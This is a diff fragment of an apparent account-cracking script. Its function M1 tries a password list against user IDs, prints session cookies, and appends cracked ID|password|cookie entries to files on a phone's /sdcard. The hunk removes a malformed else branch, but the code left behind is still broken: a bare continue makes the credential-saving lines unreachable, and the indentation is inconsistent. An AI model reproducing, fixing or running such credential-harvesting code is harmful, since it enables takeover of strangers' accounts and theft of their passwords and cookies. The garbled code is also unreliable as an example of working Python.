@@ -733,8 +733,6 @@ def M1(ids,names,passlist):
                                         if 'y' in pcookie:
                                         	print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                         continue
-                                        else:
-                                        continue
                                         open('/sdcard/NEWTON_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         HANDSOME(ids,pas,cookie)
                                         oks.append(ids)
